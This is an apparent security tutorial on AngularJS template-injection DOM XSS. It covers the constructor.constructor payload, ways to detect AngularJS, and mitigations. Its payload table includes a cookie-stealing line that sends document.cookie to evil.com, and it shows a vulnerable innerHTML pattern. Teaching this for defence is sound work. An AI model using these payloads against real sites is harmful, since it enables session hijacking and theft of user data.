

##  AngularJS and Its Role in DOM XSS

AngularJS is a JavaScript-based front-end framework that processes special attributes and expressions (like `ng-app`, `ng-model`, and `{{ }}`) to render dynamic content.  
It includes a **template engine** that evaluates expressions inside double curly braces `{{ ... }}`.

If user input is inserted directly into those curly braces without sanitization, AngularJS might evaluate **malicious JavaScript expressions**, resulting in DOM XSS.

---

##  Real Risk: AngularJS executes what's inside `{{ ... }}`

### Example:

```html
<body ng-app>
  You searched for: {{searchTerm}}
</body>
````

If the application grabs user input from the URL and injects it into the DOM like this:

```js
document.body.innerHTML += "You searched for: {{ " + searchTerm + " }}";
```

And the attacker supplies this in the URL:

```
https://victim.com/?searchTerm=constructor.constructor('alert(1)')()
```

AngularJS will evaluate that payload and execute the JavaScript: `alert(1)`.

---

##  Breakdown of the Payload

```js
{{constructor.constructor('alert(1)')()}}
```

### Let’s break it down step by step:

| Part                      | Meaning                                                                                             |
| ------------------------- | --------------------------------------------------------------------------------------------------- |
| `constructor`             | Every function in JavaScript has a `constructor` property, which is the built-in `Function` object. |
| `constructor.constructor` | Equivalent to `Function` – allows creating a new function from a string.                            |
| `'alert(1)'`              | The payload we want to execute.                                                                     |
| `()`                      | Immediately invokes the new function.                                                               |

So this line:

```js
constructor.constructor("alert(1)")()
```

Is equivalent to:

```js
new Function("alert(1)")()
```

---

## Live Testing (in DevTools Console)

You can test this in your browser’s console:

```js
constructor.constructor("alert(1)")()
```

This will immediately pop an alert.

---

##  Key Characteristics of AngularJS XSS

* Does **not require** `<script>` or `onerror`
* Executes **inside** `{{ }}`
* Relies on the presence of the `ng-app` directive
* Happens **entirely on the client side**

---

##  How to Detect AngularJS in a Web App

You can detect if AngularJS is used by checking:

| Indicator                       | Description                                                   |
| ------------------------------- | ------------------------------------------------------------- |
| `ng-app`, `ng-model`, `ng-bind` | HTML attributes specific to AngularJS                         |
| Double curly braces `{{...}}`   | Used for data binding                                         |
| JS Files                        | Look for `angular.js` or `angular.min.js` in browser DevTools |
| `angular.version`               | Type it in the DevTools console to check the version          |
| Extensions                      | Use Wappalyzer or BuiltWith to detect frameworks              |

---

##  Realistic Payloads

| Goal             | Payload                                                                                                                               |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Basic XSS        | `{{constructor.constructor('alert(1)')()}}`                                                                                           |
| Confirmation box | `{{constructor.constructor('confirm("XSS?")')()}}`                                                                                    |
| Exfiltration     | `{{constructor.constructor('fetch(`[https://evil.com/\`+document.cookie)')()}}\`](https://evil.com/`+document.cookie%29'%29%28%29}}`) |

---

##  Mitigation Strategies

1. **Do not inject user input directly into `{{ }}` bindings.**
2. Use `ng-bind` instead of raw interpolation (`{{ }}`).
3. Sanitize all user input before inserting it into the DOM.
4. Use AngularJS Strict Contextual Escaping (SCE).
5. Apply a proper Content Security Policy (CSP) to prevent arbitrary script execution.
6. Use updated Angular or migrate to Angular 2+ which has stricter templating.

---
